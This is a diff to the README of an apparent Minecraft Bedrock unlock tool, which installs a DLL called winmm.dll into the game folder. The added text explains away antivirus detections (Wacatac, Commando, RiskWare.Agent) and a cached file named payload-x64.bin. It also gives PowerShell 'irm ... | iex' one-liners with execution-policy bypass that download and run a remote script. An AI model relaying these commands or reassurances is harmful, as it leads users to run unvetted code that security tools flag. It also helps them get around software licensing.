@@ -14,8 +14,13 @@ the genuine ones, and what to do if an antivirus quarantines the file.
   does.
 - A minority of engines report it (mostly labelled `hacktool/crack`).
   **Microsoft Defender has also flagged it on some machines** (e.g. the
-  generic `Wacatac`/`Sabsik`/`Commando` ML labels). Its definitions change
-  over time, so a clean scan today does not guarantee a clean scan tomorrow.
+  generic `Wacatac`/`Sabsik`/`Commando` ML labels), and engines that sort the
+  tool as potentially unwanted report riskware category labels such as
+  `RiskWare.Agent`. Definitions change over time, so a clean scan today does
+  not guarantee a clean scan tomorrow.
+- Both entries a scan can show are the **same binary**, the unlock
+  `winmm.dll`. See [The two files an antivirus
+  flags](#the-two-files-an-antivirus-flags).
 
 ## Why antivirus engines flag it
 
@@ -29,6 +34,26 @@ the genuine ones, and what to do if an antivirus quarantines the file.
 - **Machine-learning labels.** Vendors that ship ML models report generic
   labels that change with every definition update, such as the Microsoft
   Defender `Wacatac`/`Sabsik`/`Commando` detections.
+- **Riskware category labels.** Engines that sort the tool into potentially
+  unwanted / riskware software report names built on that category, such as
+  `RiskWare.Agent`. The name says which bucket the engine put the file in,
+  not which family it found in it, and it carries no behavior claim beyond
+  that category.
+
+## The two files an antivirus flags
+
+A scan usually shows two entries, and both are the same DLL:
+
+| Path | What it is |
+|---|---|
+| `C:\XboxGames\Minecraft for Windows\Content\winmm.dll` | the installed unlock, the file the game loads |
+| `%LOCALAPPDATA%\mbu-cache\payload-x64.bin` | the installer's own offline cache copy of that same DLL, under its internal name |
+
+The cache copy is not a second component. The installer only uses it when its
+SHA-256 matches the official one, so it is byte-identical to the file in the
+game folder. Since v4.9.31 no copy the installer keeps outside the game folder
+is named `winmm.dll`, which is why the cached one is called
+`payload-x64.bin`.
 
 ## What this means for you
 
@@ -179,7 +204,7 @@ official one-liner inside another PowerShell command, for example from a
 Command Prompt window:
 
 ```
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/raw/main/i.ps1 | iex"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CoelhoFZ/Minecraft-Bedrock-Free/main/i.ps1 | iex"
 ```
 
 Windows Defender can flag that **command line** as `Trojan:Win32/Commando.A!ml`
@@ -192,7 +217,7 @@ to, so the block is about the command, not about the files of this project.
 Use one of the two official entries directly, with no wrapper around it:
 
 - In PowerShell:
-  `irm https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/raw/main/i.ps1 | iex`
+  `irm https://raw.githubusercontent.com/CoelhoFZ/Minecraft-Bedrock-Free/main/i.ps1 | iex`
 - The `install.bat` published on the
   [release page](https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/releases/latest)
 
